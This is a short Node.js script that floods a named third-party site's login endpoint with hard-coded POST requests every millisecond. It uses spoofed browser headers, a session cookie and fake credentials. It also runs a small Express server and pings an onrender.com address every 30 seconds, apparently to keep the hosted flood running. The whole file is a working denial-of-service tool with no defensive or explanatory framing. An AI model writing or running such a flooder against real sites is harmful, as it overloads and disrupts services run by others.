let conto=0;
const roo = ()=>{
    fetch("https://app.bbp168.com/login-json-check", {
        "headers": {
          "accept": "*/*",
          "accept-language": "th",
          "content-type": "application/json",
          "priority": "u=1, i",
          "sec-ch-ua": "\"Google Chrome\";v=\"131\", \"Chromium\";v=\"131\", \"Not_A Brand\";v=\"24\"",
          "sec-ch-ua-mobile": "?0",
          "sec-ch-ua-platform": "\"Windows\"",
          "sec-fetch-dest": "empty",
          "sec-fetch-mode": "cors",
          "sec-fetch-site": "same-origin",
          "x-requested-with": "XMLHttpRequest",
          "cookie": "ci_session=jm7srs1khe2jh72lric34is7qpim2e53",
          "Referer": "https://app.bbp168.com/",
          "Referrer-Policy": "strict-origin-when-cross-origin"
        },
        "body": "{\"username\":\"095456456456\",\"password\":\"gffhhgfh\"}",
        "method": "POST"
    }).then(response => {
      
    }).catch(error => {
          
    });
}


  setInterval(roo,1);


const express = require('express');
const app = express();
app.get('/', (req, res) => res.send('TO '+conto));
const PORT = process.env.PORT || 3500;

app.listen(PORT, () => {
    console.log('Proxy server running on http://localhost:'+PORT);
});


setInterval(() => {
    fetch('https://apiyw1.onrender.com/')
        .then()
        .catch();
}, 30000);
